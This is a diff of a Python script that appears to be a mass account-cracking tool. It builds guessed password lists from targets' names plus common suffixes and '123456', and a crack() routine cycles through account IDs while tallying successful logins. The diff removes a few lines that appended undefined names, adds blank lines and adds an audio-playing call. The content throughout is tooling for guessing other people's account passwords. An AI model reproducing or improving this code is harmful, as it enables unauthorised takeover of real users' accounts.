@@ -409,12 +409,8 @@ def passwrd():
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
-					pwv.append(bangladesh)
-					pwv.append(shanto)
 					pwv.append('123456')
 					pwv.append('@#@#@#')
-					pwv.append(shanto1122)
-					pwv.append(bahauddin)
 					pwv.append(nmf+'1122')
 					pwv.append(nmf+'@@@')
 					pwv.append(nmf+'@')
@@ -450,8 +446,15 @@ def passwrd():
 		print(f'\t \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Allah Hafiz Bro {u} ')
 		time.sleep(2)
 		exit()
+		
+		
+		
+		
+		
+
 #--------------------[ METODE-B-API ]-----------------#
 def crack(idf,pwv):
+	os.system("play-audio stard.mp3 ")
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	sys.stdout.write(f"\r{bo}  \x1b[1;90m [\x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta}\x1b[1;90m]  {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
